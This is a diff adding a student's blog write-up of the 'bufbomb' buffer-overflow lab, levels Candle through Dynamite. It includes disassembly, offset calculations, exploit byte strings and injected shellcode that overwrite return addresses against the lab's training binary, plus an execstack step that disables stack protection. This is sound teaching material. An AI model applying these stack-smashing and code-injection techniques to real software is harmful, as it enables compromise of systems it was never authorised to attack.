@@ -1,0 +1,211 @@
+---
+layout: post
+author: Hang Hu
+categories: c
+tags: C 
+cover: 
+---
+
+## Level 0, Candle
+
+First make my cookie.  
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ ./makecookie SA16225099
+0x79fc9ee5
+```
+```
+08048fe0 <getbuf>:
+ 8048fe0:	55                   	push   %ebp
+ 8048fe1:	89 e5                	mov    %esp,%ebp
+ 8048fe3:	83 ec 18             	sub    $0x18,%esp
+ 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax
+ 8048fe9:	89 04 24             	mov    %eax,(%esp)
+ 8048fec:	e8 6f fe ff ff       	call   8048e60 <Gets>
+ 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8048ff6:	c9                   	leave  
+ 8048ff7:	c3                   	ret    
+ 8048ff8:	90                   	nop
+ 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
+```
+Function `smoke` is at `0x08048e20`. Function `getbuf` uses address `ebp-0xc` as argument to call function `Gets`. And `Gets` puts String inputed by me at arg1, which is `ebp-0xc` in `getbuf`. In order to override return address in `getbuf`, I need to 12 bytes to fill ebp-0xc, ebp-0x8, ebp-0x4, 4 bytes to override saved ebp and 4 bytes to override return address. So sixteen `31` and `20 8e 04 08` is used as the exploit code. Note that little endian is used in intel.  
+<strong>exploit0.txt</strong>
+```
+31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 20 8e 04 08
+```
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ cat exploit0.txt | ./sendstring | ./bufbomb -t SA16225099
+Team: SA16225099
+Cookie: 0x79fc9ee5
+Type string:Smoke!: You called smoke()
+NICE JOB!
+Sent validation information to grading server
+```
+## Level 1, Sparkler
+
+Function `fizz` is at `0x08048dc0`, which is used to override the return address. Use gdb and find `ebp+0x8` in `fizz` is at `0xffffbfa4`, while `ebp+0xc` in `getbuf` is at the same address. So write my cookie(`0x79fc9ee5`) to `ebp+0xc` will set cookie as arg1 for `fizz`. Therefore, after overriding return address, use 4 bytes to fill `ebp+8` and write `e5 9e fc 79` to `ebp+0xc`.  
+<strong>exploit1.txt</strong>
+```
+31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 c0 8d 04 08 31 31 31 31 e5 9e fc 79
+```
+```
+joanna@JC:~/Downloads/lab3/bufbomb$cat exploit1.txt | ./sendstring | ./bufbomb -t SA16225099
+Team: SA16225099
+Cookie: 0x79fc9ee5
+Type string:Fizz!: You called fizz(0x79fc9ee5)
+NICE JOB!
+Sent validation information to grading server
+```
+## Level 2, Firecracker
+
+C code for bang:
+```
+int global_value = 0;
+void bang(int val)
+{
+entry_check(2); /* Make sure entered this function properly */
+if (global_value == cookie) {
+printf("Bang!: You set global_value to 0x%x\n", global_value);
+validate(2);
+} else
+printf("Misfire: global_value = 0x%x\n", global_value);
+exit(0);
+}
+```
+Assembly code for bang:
+```
+08048d60 <bang>:
+ 8048d60:	55                   	push   %ebp
+ 8048d61:	89 e5                	mov    %esp,%ebp
+ 8048d63:	83 ec 08             	sub    $0x8,%esp
+ 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+ 8048d6d:	e8 2e fc ff ff       	call   80489a0 <entry_check>
+ 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax
+ 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax
+ 8048d7d:	74 21                	je     8048da0 <bang+0x40>
+ 8048d7f:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048d83:	c7 04 24 0b 9a 04 08 	movl   $0x8049a0b,(%esp)
+ 8048d8a:	e8 d5 f9 ff ff       	call   8048764 <printf@plt>
+ 8048d8f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048d96:	e8 09 fa ff ff       	call   80487a4 <exit@plt>
+ 8048d9b:	90                   	nop
+ 8048d9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
+ 8048da0:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048da4:	c7 04 24 70 98 04 08 	movl   $0x8049870,(%esp)
+ 8048dab:	e8 b4 f9 ff ff       	call   8048764 <printf@plt>
+ 8048db0:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+ 8048db7:	e8 24 fd ff ff       	call   8048ae0 <validate>
+ 8048dbc:	eb d1                	jmp    8048d8f <bang+0x2f>
+ 8048dbe:	89 f6                	mov    %esi,%esi
+```
+Function `bang` compares cookies with global_value, which corresponds to code at `8048d77`, and `0x804a1dc`, `0x804a1cc` are either cookie or global_value.
+```
+(gdb) x/wx 0x804a1cc
+0x804a1cc <cookie>:	0x79fc9ee5
+(gdb) x/d 0x804a1dc
+0x804a1dc <global_value>:	0
+```
+So `global_value` is at `0x804a1dc`, write exploit code first.
+
+1. Set global value
+2. Push address of bang as return address
+3. ret
+```
+;Move cookie(0x79fc9ee5) to *(0x804a1dc). 
+;Note that $ means immediate value, while without $ means value at address `0x804a1dc`.
+movl $0x79fc9ee5,%eax                                                       
+movl %eax,0x804a1dc
+;Push address of bang
+push $0x8048d60
+ret
+```
+>-m32 means gcc generates 32-bit machine code.
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ gcc -m32 -c exploit2.s
+joanna@JC:~/Downloads/lab3/bufbomb$ objdump -d exploit2.o
+
+exploit2.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 e5 9e fc 79       	mov    $0x79fc9ee5,%eax
+   5:	a3 dc a1 04 08       	mov    %eax,0x804a1dc
+   a:	68 60 8d 04 08       	push   $0x8048d60
+   f:	c3                   	ret    
+```
+Add address of the beginning of this exploit to the end, which is `ebp-0xc`: `0xffffbf98-0xc=0xffffbf8c`, making a 20 bytes machine code.  
+<strong>exploit2.txt</strong>
+```
+b8 e5 9e fc 79 a3 dc a1 04 08 68 60 8d 04 08 c3 8c bf ff ff
+```
+Make the bufbomb's stack executable:
+```
+sudo apt install execstack
+execstack -s bufbomb 
+```
+And then using gdb to run bufbomb will be ok!
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ ./sendstring < exploit2.txt > exploit-raw.txt 
+joanna@JC:~/Downloads/lab3/bufbomb$ gdb ./bufbomb 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+(gdb) r -t SA16225099 < exploit-raw.txt 
+Starting program:/home/joanna/Downloads/lab3/bufbomb/bufbomb -t SA16225099 < exploit-raw.txt
+Team: SA16225099
+Cookie: 0x79fc9ee5
+Type string:Bang!: You set global_value to 0x79fc9ee5
+NICE JOB!
+Sent validation information to grading server
+```
+## Level 3, Dynamite
+
+Procedure:
+`getbuf->Gets->back to getbuf->mov $1,%eax->return to exploit code->run exploit code->return to next line of where test call getbuf`
+Exploit assembly:
+
+1. return cookie instead of 1, which uses `mov $0x79fc9ee5,%eax`
+2. push address which is the next line `getbuf` is called in function `test`, which is 0x804901e
+3. ret  
+
+exploit3.s:
+```
+mov $0x79fc9ee5,%eax
+push $0x804901e
+ret
+```
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ gcc -m32 -c exploit3.s 
+joanna@JC:~/Downloads/lab3/bufbomb$ objdump -d exploit3.o
+
+exploit3.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 e5 9e fc 79       	mov    $0x79fc9ee5,%eax
+   5:	68 1e 90 04 08       	push   $0x804901e
+   a:	c3                   	ret    
+```
+Break at `getbuf` and check the saved ebp for `getbuf` 
+```
+(gdb) x/x $ebp
+0xffffbf98:	0xffffbfb8
+```
+Saves ebp is 0xffffbfb8.  
+The final machine code consists of 11 bytes exploit code, 1 byte padding(`31` is used here), 4 bytes saved ebp of getbuf, and 4 bytes return address which returns to exploit code. The beginning of exploit code lies in where the inputed string is stored, which is `ebp-0xc` in `getbuf`.  
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ cat exploit3.txt
+b8 e5 9e fc 79 68 1e 90 04 08 c3 31 b8 bf ff ff 8c bf ff ff
+```
+I have already made bufbomb's stack excutable, so run it with gdb directly.
+```
+joanna@JC:~/Downloads/lab3/bufbomb$ ./sendstring < exploit3.txt > exploit-raw.txt 
+joanna@JC:~/Downloads/lab3/bufbomb$ gdb ./bufbomb
+Starting program:/home/joanna/Downloads/lab3/bufbomb/bufbomb -t SA16225099 < exploit-raw.txt
+Team: SA16225099
+Cookie: 0x79fc9ee5
+Type string:Boom!: getbuf returned 0x79fc9ee5
+NICE JOB!
+Sent validation information to grading server
+```
